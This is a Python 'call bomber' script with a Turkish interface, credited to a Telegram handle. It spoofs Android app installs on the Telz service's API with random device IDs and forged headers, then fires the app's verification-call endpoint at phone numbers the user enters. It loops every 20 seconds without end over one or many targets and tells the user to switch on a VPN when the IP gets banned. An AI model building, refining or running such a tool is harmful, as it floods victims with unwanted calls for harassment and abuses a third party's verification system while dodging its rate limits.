import time
import random
import string
import uuid
import json
import requests
import os
from concurrent.futures import ThreadPoolExecutor
import os,random,sys,time
os.system("clear")

E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'
Q = '\033[1;36m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
B = '\x1b[38;5;208m'
Y = '\033[1;34m'
M = '\x1b[1;37m'
S = '\033[1;33m'
U = '\x1b[1;37m'
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'


print("""
▄▀█ █▀█ ▄▀█ █▀▄▀█ ▄▀█   █▄▄ █▀█ █▀▄▀█ █▄▄ █▀▀ █▀█
█▀█ █▀▄ █▀█ █░▀░█ █▀█   █▄█ █▄█ █░▀░█ █▄█ ██▄ █▀▄

  """)
print("""  BU TOOL toskaorj'E AİTTİR. TELEGRAM: @hzyusufum

  """)
class CihazBilgisi:
    @staticmethod
    def uret():
        zaman_damgasi = round(time.time() * 1000)
        cihaz_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        cihaz_uuid = str(uuid.uuid4())
        return zaman_damgasi, cihaz_id, cihaz_uuid

class ApiIstemi:
    def __init__(self, temel_basliklar):
        self.basliklar = temel_basliklar

    def gonder(self, adres, veri):
        try:
            yanit = requests.post(adres, data=veri, headers=self.basliklar)
            return (yanit.ok and "ok" in yanit.text, yanit.text)
        except Exception as e:
            return (False, str(e))

class UygulamaKurucu:
    def __init__(self, telefon_numarasi, basliklar):
        self.telefon_numarasi = telefon_numarasi
        self.api_istemci = ApiIstemi(basliklar)
        self.kurulum_api = "https://api.telz.com/app/install"
        self.dogrulama_api = "https://api.telz.com/app/auth_call"

    def kur(self, tekrar_sayisi=2):
        ts, android_id, uid = CihazBilgisi.uret()
        kurulum_verisi = json.dumps({
            "android_id": android_id,
            "app_version": "17.5.17",
            "event": "install",
            "google_exists": "yes",
            "os": "android",
            "os_version": "9",
            "play_market": True,
            "ts": ts,
            "uuid": uid
        })
        for _ in range(tekrar_sayisi):
            basarili, _ = self.api_istemci.gonder(self.kurulum_api, kurulum_verisi)
            if basarili:
                self.dogrula(ts, android_id, uid)

    def dogrula(self, ts, android_id, uid):
        dogrulama_verisi = json.dumps({
            "android_id": android_id,
            "app_version": "17.5.17",
            "attempt": "0",
            "event": "auth_call",
            "lang": "ar",
            "os": "android",
            "os_version": "9",
            "phone": f"+{self.telefon_numarasi}",
            "ts": ts,
            "uuid": uid
        })
        basarili, yanit = self.api_istemci.gonder(self.dogrulama_api, dogrulama_verisi)
        if basarili:
            print(f"\x1b[1;32m\n✅ +{self.telefon_numarasi} Numarasına Başarılı Arama Gönderildi .")
        else:
            print(f"\x1b[1;31m\n❌ +{self.telefon_numarasi} Numarasına Arama Gönderilmedi : {yanit}")

def numaralari_isle(numaralar):
    basliklar = {
        "User-Agent": "Telz-Android/17.5.17",
        "Content-Type": "application/json"
    }

    try:
        while True:
            for numara in numaralar:
                kurucu = UygulamaKurucu(numara, basliklar)
                kurucu.kur(tekrar_sayisi=1)
            time.sleep(20)
    except Exception as e:
        print("\x1b[1;31mIP Ban Yedin Vpn Açıp Tekrar Dene ⛔")

if __name__ == "__main__":

    print("\x1b[1;33m 📝 Nasıl Kullanır ? \n\n • Çoklu Gönderim İçin Numaraların Arasına Virgül Koyarak Yolla.\n • Tekli Gönderim İçin 1 Tane Numara Yazıp Yolla.\n\n\x1b[1;33m 📌 Örnek : \n\n  👤Tekli Gönderim : +905466781432\n  👥Çoklu Gönderim : +905466781432,+905411122733")

    yazi = input("\n\x1b[1;35m Aranacak Numarayı Gir : ")
    numaralar = [num.strip().replace("+", "") for num in yazi.split(",") if num.strip().replace("+", "").isdigit()]
    if not numaralar:
        print("\x1b[1;31m❗Eksik Veya Yanlış Tuşladın")
    else:
        print("\x1b[1;32m\n📞 Arama Gönderiliyor,Bekleyiniz...")

        print("🔄 20 Saniye Sonra Tekrar Gönderilecektir ")
        numaralari_isle(numaralar)
